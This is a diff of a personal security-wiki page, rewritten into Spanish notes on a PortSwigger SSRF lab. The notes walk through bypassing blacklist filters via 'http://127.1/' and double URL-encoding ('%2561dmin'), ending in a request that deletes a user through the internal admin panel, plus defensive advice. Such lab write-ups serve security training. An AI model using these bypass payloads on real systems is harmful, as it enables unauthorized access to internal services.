@@ -10,13 +10,9 @@
       
       
       
-        <link rel="canonical" href="https://igruntplay.github.io/BSCP/practicioner-labs-notes/">
+        <link rel="canonical" href="https://igruntplay.github.io/BSCP/ssrf-practicioner-lab-notes/">
       
       
-        <link rel="prev" href="../BSCP/">
-      
-      
-        <link rel="next" href="../OAuth-account-hijacking-via-redirect_uri/">
       
       
         
@@ -27,7 +23,7 @@
     
     
       
-        <title>BSCP Practitioner Labs - Grunt's Personal Wiki</title>
+        <title>SSRF - Filtro de entrada basado en blacklist (PortSwigger Lab) - Grunt's Personal Wiki</title>
       
     
     
@@ -78,7 +74,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#practicioner-labs-notes-index" class="md-skip">
+        <a href="#ssrf-filtro-de-entrada-basado-en-blacklist-portswigger-lab" class="md-skip">
           Saltar a contenido
         </a>
       
@@ -114,7 +110,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              BSCP Practitioner Labs
+              SSRF - Filtro de entrada basado en blacklist (PortSwigger Lab)
             
           </span>
         </div>
@@ -828,10 +824,8 @@
       
   
   
-    
   
   
-  
     
     
       
@@ -852,11 +846,11 @@
       
     
     
-    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" checked>
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
         
           
           <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="">
@@ -877,7 +871,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="true">
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
           <label class="md-nav__title" for="__nav_4">
             <span class="md-nav__icon md-icon"></span>
             
@@ -920,37 +914,10 @@
                 
   
   
-    
   
   
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
-      
-      
-        
-      
-      
-        <label class="md-nav__link md-nav__link--active" for="__toc">
-          
-  
-  
-  <span class="md-ellipsis">
-    
-  
-    BSCP Practitioner Labs
-  
-
-    
-  </span>
-  
-  
-
-          <span class="md-nav__icon md-icon"></span>
-        </label>
-      
-      <a href="./" class="md-nav__link md-nav__link--active">
+    <li class="md-nav__item">
+      <a href="../practicioner-labs-notes/" class="md-nav__link">
         
   
   
@@ -966,37 +933,6 @@
   
 
       </a>
-      
-        
-
-<nav class="md-nav md-nav--secondary" aria-label="Tabla de contenidos">
-  
-  
-  
-    
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      Tabla de contenidos
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#labs" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Labs
-      
-    </span>
-  </a>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-      
     </li>
   
 
@@ -1594,7 +1530,7 @@
 
 
   
-    <a href="https://github.com/G4sp4rCS/igruntplay.github.io/edit/master/docs/BSCP/practicioner-labs-notes.md" title="Editar esta página" class="md-content__button md-icon" rel="edit">
+    <a href="https://github.com/G4sp4rCS/igruntplay.github.io/edit/master/docs/BSCP/ssrf-practicioner-lab-notes.md" title="Editar esta página" class="md-content__button md-icon" rel="edit">
       
       <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M10 20H6V4h7v5h5v3.1l2-2V8l-6-6H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h4zm10.2-7c.1 0 .3.1.4.2l1.3 1.3c.2.2.2.6 0 .8l-1 1-2.1-2.1 1-1c.1-.1.2-.2.4-.2m0 3.9L14.1 23H12v-2.1l6.1-6.1z"/></svg>
     </a>
@@ -1602,22 +1538,60 @@
   
 
 
-<h1 id="practicioner-labs-notes-index">Practicioner labs notes index<a class="headerlink" href="#practicioner-labs-notes-index" title="Permanent link">&para;</a></h1>
-<p>Step 1: Complete all the listed practitioner-level labs
-Work through all of the labs in the list below, completing each lab in turn. There is no set time frame for completing the labs, but you must be able to do so without requiring access to the solutions provided.</p>
-<p>If you're unable to complete the lab you selected, go back to the learning materials and read through the content carefully, working through all the labs in that topic to make sure you're comfortable with the vulnerability class and exploit techniques it covers.</p>
-<hr />
-<ol>
-<li><a href="../lab-file-upload-web-shell-upload-via-extension-blacklist-bypass/">WebShell via extension blacklist bypass</a></li>
-<li><a href="../OAuth-account-hijacking-via-redirect_uri/">OAuth account hijacking via redirect_uri</a></li>
-</ol>
-<hr />
-<h2 id="labs">Labs<a class="headerlink" href="#labs" title="Permanent link">&para;</a></h2>
+<h1 id="ssrf-filtro-de-entrada-basado-en-blacklist-portswigger-lab">SSRF - Filtro de entrada basado en blacklist (PortSwigger Lab)<a class="headerlink" href="#ssrf-filtro-de-entrada-basado-en-blacklist-portswigger-lab" title="Permanent link">&para;</a></h1>
+<p>Lab: https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter</p>
+<h2 id="objetivo-del-lab">Objetivo del lab<a class="headerlink" href="#objetivo-del-lab" title="Permanent link">&para;</a></h2>
+<p>Usar la funcionalidad "Check stock" para forzar al servidor a pedir recursos internos:
+- Acceder a <code>http://localhost/admin</code>
+- Borrar el usuario <code>carlos</code></p>
+<h2 id="idea-clave">Idea clave<a class="headerlink" href="#idea-clave" title="Permanent link">&para;</a></h2>
+<p>El endpoint de stock (<code>POST /product/stock</code>) recibe un parámetro tipo URL (<code>stockApi=</code>) que el servidor fetchea.
+El lab intenta frenar SSRF con <strong>blacklists débiles</strong>:
+- Bloqueo de loopback (<code>127.0.0.1</code> / <code>localhost</code>) por coincidencia de string.
+- Bloqueo de la ruta <code>admin</code> por coincidencia de string.</p>
+<p>La explotación consiste en:
+1. Bypassear el filtro de loopback usando una representación alternativa de <code>127.0.0.1</code>.
+2. Bypassear el filtro de <code>admin</code> ofuscando el string con URL-encoding (doble encoding).</p>
+<h2 id="donde-mirar">Dónde mirar<a class="headerlink" href="#donde-mirar" title="Permanent link">&para;</a></h2>
 <ul>
-<li><a href="../cors-practicioner-lab-notes/">CORS</a></li>
-<li><a href="../csrf-practicioner-lab-notes-1/">CSRF-1</a></li>
-<li><a href="../csrf-practicioner-lab-notes-2/">CSRF-2</a></li>
-<li><a href="../ssrf-practicioner-lab-notes/">SSRF</a></li>
+<li>UI: cualquier producto -&gt; "Check stock"</li>
+<li>Request: <code>POST /product/stock</code></li>
+<li>Param vulnerable: <code>stockApi</code></li>
+</ul>
+<h2 id="como-resolverlo-pasos-en-burp">Cómo resolverlo (pasos en Burp)<a class="headerlink" href="#como-resolverlo-pasos-en-burp" title="Permanent link">&para;</a></h2>
+<ol>
+<li>En un producto, click "Check stock".</li>
+<li>Intercepta la request y mandala a Repeater.</li>
+<li>Proba loopback directo:</li>
+<li><code>stockApi=http://127.0.0.1/</code></li>
+<li>Debería quedar bloqueado (defensa 1).</li>
+<li>Bypass loopback:</li>
+<li><code>stockApi=http://127.1/</code></li>
+<li><code>127.1</code> suele resolverse como <code>127.0.0.1</code>.</li>
+<li>Intentar admin:</li>
+<li><code>stockApi=http://127.1/admin</code></li>
+<li>Debería quedar bloqueado (defensa 2).</li>
+<li>Bypass <code>admin</code> con doble URL encoding de la <code>a</code>:</li>
+<li><code>admin</code> -&gt; <code>%2561dmin</code> (donde <code>%61</code> es <code>a</code>, y <code>%25</code> es el <code>%</code>)</li>
+<li>Probar: <code>stockApi=http://127.1/%2561dmin</code></li>
+<li>Ejecutar la acción final:</li>
+<li><code>stockApi=http://127.1/%2561dmin/delete?username=carlos</code></li>
+</ol>
+<h2 id="payload-final-request-minima">Payload final (request mínima)<a class="headerlink" href="#payload-final-request-minima" title="Permanent link">&para;</a></h2>
+<div class="language-http highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="nf">POST</span> <span class="nn">/product/stock</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">2</span>
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="na">Host</span><span class="o">:</span> <span class="l">TARGET_HOST</span>
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="nt">stockApi</span><span class="o">=</span><span class="s">http://127.1/%2561dmin/delete?username</span><span class="o">=</span><span class="s">carlos</span>
+</span></code></pre></div>
+<p>Nota: dependiendo de cómo Burp/tu editor haga encoding, podés ver la variante equivalente:
+- <code>%2561</code> == <code>%25%36%31</code> (representan el mismo doble-encoding de <code>a</code>)</p>
+<h2 id="notas-de-defensa-para-recordar">Notas de defensa (para recordar)<a class="headerlink" href="#notas-de-defensa-para-recordar" title="Permanent link">&para;</a></h2>
+<ul>
+<li>Evitar blacklists: usar allowlists de destinos/hosts y rutas permitidas.</li>
+<li>Parsear/normalizar URLs de forma consistente (antes de validar y antes de usar).</li>
+<li>Bloquear acceso a redes internas después de resolver DNS (y controlar redirects).</li>
+<li>Egress filtering / segmentación: el servidor no debería poder hablar con <code>localhost</code>/metadata/admin panels.</li>
 </ul>
 
 
